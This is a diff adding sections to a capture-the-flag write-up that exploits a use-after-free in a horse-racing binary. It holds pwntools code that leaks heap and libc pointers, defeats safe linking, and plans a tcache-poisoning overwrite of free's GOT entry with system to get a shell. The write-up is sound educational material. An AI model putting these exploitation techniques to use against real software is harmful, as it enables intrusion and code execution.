@@ -668,6 +668,8 @@ Which causes libc to allocate in the order `C0`, `C3`  making us  lose  `C1` and
 
 We add chunks to the tcache bin by allocating and freeing chunks, which we can do by adding a horse and removing it, which will put its name in the bin. Remember that when a horse is removed, **horseName** is freed but not set to zero, so we can still get some function to access it. After the chunk is freed, the first 8 bytes of the location pointed to by **horseName** becomes **fd** of the free chunk. From reversing the binary, we know that cheating is a little broken and doesn't check if a buffer has been freed before writing to it, so we can use that to change what **fd** writes to! Lets write a little script to see this in action.
 
+*Make sure to change the terminal to one that you're using*
+
 ```python
 #! /usr/bin/python
 import pwn
@@ -734,6 +736,147 @@ If this value is leaked, we can "sign" our fake pointers and make them accuratel
 
 To leak pointers we'll add some horses and remove some horses to put some chunks on tcache bin. Afterwards we add more horses to claim those chunks that were originally in tcache. If we enter "\xff" for our horse name we avoid having to write over the pointers these chunks have and they will be printed out as the horse names when the horses race! We'll look for the smallest value because that will be the one that is xored with the NULL pointer. Then we can make our malicious pointer.
 
+Here is some spaghetti code I wrote to grab some of the pointers
+```python
+def getPointers():
+	p.sendlineafter("Choice: ", b"3")
+	data = b""
+	x = p.recvline()
+	data += x
+	while (not (b"WINNER" in x)):
+		x = p.recvline()
+		data += x
+		if (b"\n\n" in data):
+			print("done recieving data!")
+			break
+	somePointers = data.split(b"|")
+	leakedPointers = []
+	
+	print(data)
+	for pointer in somePointers:
+		pointer = pointer.strip(b" \n")
+		pointer = pointer.ljust(8, b"\x00")
+		pointer = pwn.u64(pointer)
+		if (pointer != 0):
+			leakedPointers.append(pointer)
+			print(hex(pointer))
+	print(f"The value you seek is {hex(min(leakedPointers))}")
+	return min(leakedPointers)
+```
+
+This just parses the ascii art that gets printed when racing and grabs all the data from the starting frame. The game prints "\n\n" for my terminal when its done printing the 18 horses and is going to print another frame, but on the challenge instance it prints "\r\n\r\n\r\n" so I think it depends on the terminal.
+
+This is the code to setup the horses so they leak addresses
+
+```python
+#malloc some chunks of same size
+for i in range(5):
+	print(f"adding horse {i}")
+	addHorse(i, 256, b"\xff")
+
+#free these chunks and put them in tcache
+for i in range(4, -1, -1):
+	print(f"removing horse {i}")
+	removeHorse(i)
+
+#these chunks are returned to us with metadata in them
+for i in range(5):
+	print(f"adding horse {i}")
+	addHorse(i, 256, b"\xff")
+
+#we start racing and grab the leaked data
+ASLR = getPointers()
+
+#put two horses into tcache bin
+removeHorse(0)
+removeHorse(1)
+
+#horse 1 is the first horse, make it point to 0xdeadbeef00 instead of horse 0
+cheat(1, pwn.p64(0xdeadbeef00 ^ ASLR) + b"\xff")
+
+#examine our work
+pwn.gdb.attach(p, "heap bins") 
+time.sleep(2)
+```
+
+![parsing leaked data](images/leakedHeap.png)
+<br>
+Now libc recognizes what we are pointing to!
+<br>
+![we got libc to find where to write to](images/writeBeef.png)
+<br>
+We know where GOT is, so now we just need to find where **system** is and find a function to replace!
+
+
+###  Leaking libc base
+We know that we can leak free chunk pointers, but they all point to heap and we need to get the address of libc, how will we do that? Enter the unsorted bin! After the tcache bins for a specific size are full, newly freed chunks of that size will first go into the unsorted bin before libc decides where to put them. If more chunks get freed and they are next to chunks in the unsorted bin, they just get combined into bigger chunks (There is only one unsorted bin so chunks can be any size). If there is only one chunk in the unsorted bin, its forward pointer points towards internal libc structures. Thus, if we can get a horse to get a chunk that was originally in the unsorted bin, we can get it to leak an address within libc. We can use this address to calculate the libc base and get the addresses of all sorts of funny things like where **system** is. Below is some changes to our code.
+
+```python
+#malloc some chunks of same size
+for i in range(9):
+	print(f"adding horse {i}")
+	addHorse(i, 256, b"\xff")
+
+#free these chunks and put them in tcache
+for i in range(8, -1, -1):
+	print(f"removing horse {i}")
+	removeHorse(i)
+
+#ensure we have unsorted bin
+pwn.gdb.attach(p, "heap bins")
+time.sleep(2)
+
+#these chunks are returned to us with metadata in them
+#horses 0-6 are in tcache, horses 7-8 are in unsorted
+for i in range(9):
+	print(f"adding horse {i}")
+	addHorse(i, 256, b"\xff")
+
+#we start racing and grab the leaked data
+ASLR, libc = getPointers()
+
+#put two horses into tcache bin
+removeHorse(0)
+removeHorse(1)
+
+#horse 1 is the first horse, make it point to 0xdeadbeef00 instead of horse 0
+cheat(1, pwn.p64(0xdeadbeef00 ^ ASLR) + b"\xff")
+
+#examine our work (make sure there is 0xdeadbeef00 pointer)
+pwn.gdb.attach(p, "heap bins") 
+time.sleep(2)
+```
+
+To get chunks into the unsorted bin we first need to saturate tcache, then our next chunk should end up unsorted, we can just use our previous code but add 9 (I add two chunks instead of one to the unsorted bin because for some reason the pointer goes away after allocation if the entire unsorted bin is claimed at once ) horses instead of the minimum of 5.
+
+We also modify getPointers() to return the highest address leaked which will be libc leak
+```python
+print(f"Libc leak at {hex(max(leakedPointers))}!")
+return min(leakedPointers), max(leakedPointers) 
+```
+
+Now an unsorted bin appears and it holds a pointer into libc! Even better, this pointer isn't mangled because safe linking only applies to fast and tcache bins!
+
+![unsorted bins forced](images/gotUnsorted.png)
+
+Now that we have leaked a libc address, we just need to find a value to offset it from to get libc base! The libc base can be found by typing `info proc mappings` into gdb and then you can subtract it from the value that is leaked. The number to add to the leaked address in this case is `-0x1bde10` (Although it seems allocating and freeing different numbers of chunks results in different numbers). 
+
+```python
+#we start racing and grab the leaked data
+magicNumber = -0x1bde10
+ASLR, libc = getPointers()
+#get libc base and set address of pwn elf file object to it
+libcBase = libc + magicNumber
+libcFile.address = libcBase
+```
+
+### Getting a shell
+
+We have libc base and the ability to allocate a chunk of memory at arbitrary addresses, we can combine these abilities to overwrite a function address in the GOT and point it to system! Lets find a suitable function to replace. 
+
+![lets replace free](images/findingGOT.png)
+
+Free seems like a good function to replace, we can remove a horse named "/bin/sh" which will free() it, if free is replaced with system we will get a shell! Free is at address 0x404018, so we want a chunk that starts there. However, libc wants chunk addresses aligned to 0x10 bytes so we must actually start at 0x404010, therefore after we allocate our chunk we need to write 8 bytes of filler before we write the address of system. 
 
 When allocating from the tcache bins, we allocate from the head, or the most recently freed chunk. After allocating from this chunk, libc will save the **fd** 
 
